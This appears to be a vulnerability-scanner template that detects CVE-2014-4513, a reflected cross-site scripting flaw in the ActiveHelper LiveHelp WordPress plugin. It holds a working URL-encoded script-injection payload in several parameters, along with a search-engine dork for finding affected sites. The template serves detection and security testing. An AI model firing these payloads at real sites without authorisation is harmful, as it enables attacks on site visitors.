flow: http(1) && http(2)
http:
- matchers:
  - internal: true
    type: word
    words:
    - ActiveHelper LiveHelp Live Chat
  raw:
  - 'GET /wp-content/plugins/activehelper-livehelp/readme.txt HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - part: body
    type: word
    words:
    - </textarea></script><script>alert(document.domain)</script>
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/wp-content/plugins/activehelper-livehelp/server/offline.php?MESSAGE=MESSAGE%3C%2Ftextarea%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&DOMAINID=DOMAINID&COMPLETE=COMPLETE&TITLE=TITLE&URL=URL&COMPANY=COMPANY&SERVER=SERVER&PHONE=PHONE&SECURITY=SECURITY&BCC=BCC&EMAIL=EMAIL%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&NAME=NAME%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&'
id: CVE-2014-4513
info:
  author: daffainfo
  classification:
    cpe: cpe:2.3:a:activehelper:activehelper_livehelp_live_chat:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2014-4513
    cvss-metrics: CVSS:2.0/AV:N/AC:M/Au:N/C:N/I:P/A:N
    cvss-score: 4.3
    cwe-id: CWE-79
    epss-percentile: 0.87599
    epss-score: 0.03718
  description: Multiple cross-site scripting vulnerabilities in server/offline.php
    in the ActiveHelper LiveHelp Live Chat plugin 3.1.0 and earlier for WordPress
    allow remote attackers to inject arbitrary web script or HTML via the (1) MESSAGE,
    (2) EMAIL, or (3) NAME parameter.
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    inject malicious scripts into web pages viewed by users, leading to potential
    data theft or unauthorized actions.

    '
  metadata:
    framework: wordpress
    google-query: inurl:"/wp-content/plugins/activehelper-livehelp"
    max-request: 2
    product: activehelper_livehelp_live_chat
    vendor: activehelper
  name: ActiveHelper LiveHelp Server 3.1.0 - Cross-Site Scripting
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2014-4513
  - http://codevigilant.com/disclosure/wp-plugin-activehelper-livehelp-a3-cross-site-scripting-xss
  remediation: 'Upgrade to a patched version of ActiveHelper LiveHelp Server or apply
    the necessary security patches to mitigate the XSS vulnerability.

    '
  severity: medium
  tags: cve2014,cve,wordpress,xss,wp-plugin,activehelper,vuln
